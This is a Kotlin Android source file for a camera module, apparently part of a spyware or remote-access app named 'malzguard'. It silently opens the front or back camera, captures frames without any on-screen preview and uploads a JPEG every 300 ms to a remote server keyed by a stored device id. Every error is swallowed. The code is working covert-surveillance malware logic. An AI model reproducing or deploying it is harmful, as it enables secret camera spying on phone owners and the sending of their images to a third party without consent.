package com.example.malzguard

import android.content.Context
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.Matrix
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import java.io.ByteArrayOutputStream
import java.io.OutputStream
import java.net.HttpURLConnection
import java.net.URL

object CameraStreamer {
    private var thread: HandlerThread? = null
    private var handler: Handler? = null
    private var running = false
    private var cam: CameraDevice? = null
    private var reader: ImageReader? = null
    private var facing = "back"
    private var server = ""
    private var id = ""
    private var lastPush = 0L

    fun start(ctx: Context, facingArg: String) {
        try {
            stop()
            facing = facingArg
            server = Config.SERVER
            id = ctx.getSharedPreferences("mg", Context.MODE_PRIVATE).getString("id", "") ?: ""
            if (id.isEmpty()) return
            thread = HandlerThread("camstream").also { it.start() }
            handler = Handler(thread!!.looper)
            running = true
            handler!!.post { openCam(ctx) }
        } catch (e: Exception) { running = false }
    }

    fun stop() {
        running = false
        try { cam?.close() } catch (e: Exception) {}
        cam = null
        try { reader?.close() } catch (e: Exception) {}
        reader = null
        try { thread?.quitSafely() } catch (e: Exception) {}
        thread = null
        handler = null
    }

    private fun openCam(ctx: Context) {
        try {
            val cm = ctx.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val camId = cm.cameraIdList.firstOrNull { cid ->
                val ch = cm.getCameraCharacteristics(cid)
                val f = ch.get(CameraCharacteristics.LENS_FACING)
                if (facing == "front") f == CameraCharacteristics.LENS_FACING_FRONT else f == CameraCharacteristics.LENS_FACING_BACK
            } ?: cm.cameraIdList.firstOrNull() ?: return
            val ch = cm.getCameraCharacteristics(camId)
            
            // Get sensor rotation
            val sensorOrientation = ch.get(CameraCharacteristics.SENSOR_ORIENTATION) ?: 0
            
            val sizes = ch.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)?.getOutputSizes(ImageReader::class.java)
            // Pake resolusi 640x480 biar ringan dan ga blank
            val sz = sizes?.filter { it.width <= 640 && it.height <= 480 }?.minByOrNull { it.width * it.height }
                ?: sizes?.minByOrNull { it.width * it.height } ?: return
                
            reader = ImageReader.newInstance(sz.width, sz.height, android.graphics.ImageFormat.JPEG, 2)
            reader!!.setOnImageAvailableListener({ r ->
                if (!running) return@setOnImageAvailableListener
                try {
                    val img = r.acquireLatestImage() ?: return@setOnImageAvailableListener
                    val buf = img.planes[0].buffer
                    val bytes = ByteArray(buf.remaining()); buf.get(bytes)
                    img.close()
                    val now = System.currentTimeMillis()
                    if (now - lastPush < 300) return@setOnImageAvailableListener
                    lastPush = now
                    
                    // Rotate image based on sensor orientation
                    var bmp = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
                    if (bmp != null && sensorOrientation != 0) {
                        val matrix = Matrix()
                        matrix.postRotate(sensorOrientation.toFloat())
                        val rotated = Bitmap.createBitmap(bmp, 0, 0, bmp.width, bmp.height, matrix, true)
                        val out = ByteArrayOutputStream()
                        rotated.compress(Bitmap.CompressFormat.JPEG, 70, out)
                        pushFrame(out.toByteArray())
                        bmp.recycle()
                        rotated.recycle()
                    } else if (bmp != null) {
                        pushFrame(bytes)
                        bmp.recycle()
                    }
                } catch (e: Exception) {}
            }, handler)
            
            cm.openCamera(camId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cam = camera
                    try {
                        camera.createCaptureSession(listOf(reader!!.surface), object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(sess: CameraCaptureSession) {
                                try {
                                    val req = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW)
                                    req.addTarget(reader!!.surface)
                                    req.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                                    sess.setRepeatingRequest(req.build(), object : CameraCaptureSession.CaptureCallback() {}, handler)
                                } catch (e: Exception) {}
                            }
                            override fun onConfigureFailed(sess: CameraCaptureSession) {}
                        }, handler)
                    } catch (e: Exception) {}
                }
                override fun onDisconnected(camera: CameraDevice) { try { camera.close() } catch (e: Exception) {}; running = false }
                override fun onError(camera: CameraDevice, e: Int) { try { camera.close() } catch (e: Exception) {}; running = false }
            }, handler)
        } catch (e: Exception) { running = false }
    }

    private fun pushFrame(bytes: ByteArray) {
        try {
            val c = URL("$server/api/stream/$id").openConnection() as HttpURLConnection
            c.connectTimeout = 5000; c.readTimeout = 5000
            c.requestMethod = "POST"; c.doOutput = true
            c.setRequestProperty("Content-Type", "image/jpeg")
            c.setFixedLengthStreamingMode(bytes.size)
            val os: OutputStream = c.outputStream
            os.write(bytes); os.flush(); os.close()
            try { c.responseCode; c.inputStream?.close() } catch (e: Exception) {}
            try { c.disconnect() } catch (e: Exception) {}
        } catch (e: Exception) {}
    }
}
